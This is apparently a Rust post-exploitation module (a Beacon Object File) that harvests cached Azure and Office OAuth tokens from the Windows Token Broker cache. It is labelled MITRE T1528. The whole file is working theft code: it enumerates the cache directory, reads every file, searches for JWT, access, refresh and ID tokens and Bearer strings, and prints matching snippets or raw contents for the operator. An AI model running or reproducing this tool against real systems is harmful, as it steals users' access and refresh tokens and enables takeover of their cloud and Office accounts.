//! # Get Azure Token BOF
//!
//! Reads cached Azure/Office OAuth tokens from the Token Broker cache at
//! `%LOCALAPPDATA%\Microsoft\TokenBroker\Cache\`. Enumerates and reads
//! token cache files, printing their contents for offline analysis.
//! ## MITRE ATT&CK
//! - T1528 - Steal Application Access Token
//!
//! ## Arguments
//! - None.

#![no_std]

use alloc::vec;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, INVALID_HANDLE_VALUE, ERROR_NO_MORE_FILES,
};
use windows_sys::Win32::Storage::FileSystem::*;

unsafe extern "system" {
    fn ExpandEnvironmentStringsA(
        src: *const u8,
        dst: *mut u8,
        size: u32,
    ) -> u32;
}

const MAX_FILE_SIZE: usize = 1024 * 1024;

const TOKEN_PATTERNS: &[&[u8]] = &[
    b"eyJ",           // JWT prefix (base64 JSON)
    b"access_token",
    b"refresh_token",
    b"id_token",
    b"Bearer ",
    b"\"token\"",
];

fn cstr_to_str(buf: &[u8]) -> &str {
    let len = buf.iter().position(|&b| b == 0).unwrap_or(buf.len());
    core::str::from_utf8(&buf[..len]).unwrap_or("")
}

fn read_file_contents(path: &str) -> Option<alloc::vec::Vec<u8>> {
    let mut path_buf = alloc::vec::Vec::from(path.as_bytes());
    path_buf.push(0);

    unsafe {
        let handle = CreateFileA(
            path_buf.as_ptr(),
            0x80000000, // GENERIC_READ
            FILE_SHARE_READ,
            core::ptr::null(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            core::ptr::null_mut(),
        );

        if handle == INVALID_HANDLE_VALUE {
            return None;
        }

        let mut size_high: u32 = 0;
        let size_low = GetFileSize(handle, &mut size_high);
        let file_size = ((size_high as u64) << 32 | size_low as u64) as usize;

        if file_size == 0 || file_size > MAX_FILE_SIZE {
            CloseHandle(handle);
            return None;
        }

        let mut buf = vec![0u8; file_size];
        let mut bytes_read: u32 = 0;
        let ok = ReadFile(
            handle,
            buf.as_mut_ptr() as *mut u8,
            file_size as u32,
            &mut bytes_read,
            core::ptr::null_mut(),
        );
        CloseHandle(handle);

        if ok == 0 {
            return None;
        }

        buf.truncate(bytes_read as usize);
        Some(buf)
    }
}

fn search_tokens(data: &[u8], filename: &str) -> usize {
    let mut count = 0usize;

    for &pattern in TOKEN_PATTERNS {
        if data.len() < pattern.len() {
            continue;
        }
        let mut i = 0;
        while i <= data.len() - pattern.len() {
            if &data[i..i + pattern.len()] == pattern {
                let start = if i >= 16 { i - 16 } else { 0 };
                let end = core::cmp::min(i + pattern.len() + 80, data.len());
                let snippet = &data[start..end];
                let display: alloc::vec::Vec<u8> = snippet
                    .iter()
                    .map(|&b| if b >= 0x20 && b < 0x7f { b } else { b'.' })
                    .collect();
                if let Ok(s) = core::str::from_utf8(&display) {
                    let pat_str = core::str::from_utf8(pattern).unwrap_or("?");
                    println!("  [{}] pattern='{}': {}", filename, pat_str, s);
                    count += 1;
                }
                i += pattern.len() + 16;
            } else {
                i += 1;
            }
        }
    }
    count
}

#[rustbof::main]
fn main(_args: *mut u8, _len: usize) {
    println!("get_azure_token: Reading Azure/Office OAuth token cache");

    let env_path = b"%LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache\\*\0";
    let mut expanded = [0u8; 512];
    let result = unsafe {
        ExpandEnvironmentStringsA(env_path.as_ptr(), expanded.as_mut_ptr(), expanded.len() as u32)
    };

    if result == 0 {
        eprintln!("Failed to expand environment string (error {:#X})", unsafe { GetLastError() });
        return;
    }

    let search_path = cstr_to_str(&expanded);
    println!("  Searching: {}", search_path);

    let dir_prefix = &search_path[..search_path.len() - 1];

    unsafe {
        let mut fd: WIN32_FIND_DATAA = core::mem::zeroed();
        let handle = FindFirstFileA(expanded.as_ptr(), &mut fd);

        if handle == INVALID_HANDLE_VALUE {
            let err = GetLastError();
            if err == 2 || err == 3 {
                println!("Token Broker cache directory not found.");
            } else {
                eprintln!("FindFirstFileA failed (error {:#X})", err);
            }
            return;
        }

        let mut total_found: usize = 0;
        let mut files_checked: u32 = 0;

        loop {
            let name_bytes = core::slice::from_raw_parts(fd.cFileName.as_ptr() as *const u8, 260);
            let name = cstr_to_str(name_bytes);

            if fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY == 0 && !name.is_empty() {
                let mut full_path = alloc::string::String::from(dir_prefix);
                full_path.push_str(name);

                let file_size = (fd.nFileSizeHigh as u64) << 32 | fd.nFileSizeLow as u64;
                println!("  File: {} ({} bytes)", name, file_size);

                if let Some(data) = read_file_contents(&full_path) {
                    let found = search_tokens(&data, name);
                    total_found += found;

                    if data.len() <= 4096 && found == 0 {
                        let printable = data.iter().filter(|&&b| b >= 0x20 && b < 0x7f).count();
                        if printable > data.len() / 2 {
                            let display: alloc::vec::Vec<u8> = data
                                .iter()
                                .map(|&b| if b >= 0x20 && b < 0x7f { b } else { b'.' })
                                .collect();
                            if let Ok(s) = core::str::from_utf8(&display) {
                                println!("  [{}] content: {}", name, &s[..core::cmp::min(s.len(), 256)]);
                            }
                        }
                    }
                }
                files_checked += 1;
            }

            if FindNextFileA(handle, &mut fd) == 0 {
                break;
            }
        }

        FindClose(handle);

        println!("Checked {} cache files, found {} token artifact(s)", files_checked, total_found);
        if total_found > 0 {
            println!("SUCCESS.");
        } else {
            println!("No OAuth tokens found in Token Broker cache.");
        }
    }
}
